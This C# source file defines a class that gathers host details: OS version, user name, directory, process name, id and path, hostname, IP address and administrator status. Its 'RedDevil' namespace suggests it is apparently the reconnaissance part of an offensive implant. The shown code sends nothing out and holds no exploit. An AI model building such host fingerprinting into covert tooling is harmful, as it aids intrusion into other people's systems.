using System;
using System.Diagnostics;
using System.Net;

namespace RedDevil
{
    class GeneralInfo
    {
        // Variables for holding information

        public string oSystem; // string to save operating system
        public string uName; // String to save username
        public string cDirectory; // String to save current directory
        public string pName; // Strinng to save process path
        public string ePath; // String to store executable path
        public string ipv4Addres; // String to save ipv4Addres
        public string hostName; // String to save current hostname
        public int pid; // int to save process id
        public bool isadmin; // bool variable to check if user is admin

        // function
        public GeneralInfo(){
            oSystem = Environment.OSVersion.ToString();
            uName = Environment.UserName;
            cDirectory = Environment.CurrentDirectory;
            pName = Process.GetCurrentProcess().ProcessName;
            pid = Process.GetCurrentProcess().Id;
            ePath = Process.GetCurrentProcess().MainModule.FileName;
            hostName = Dns.GetHostName();
            ipv4Addres = Dns.GetHostEntry(hostName).AddressList[1].ToString();

            //TO check id user is admin
            //check if user is in user group
            // use IsInRole method to check if user has administrator privileges
            using var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
            var principal = new System.Security.Principal.WindowsPrincipal(identity);
            isadmin = principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
        }
    }
}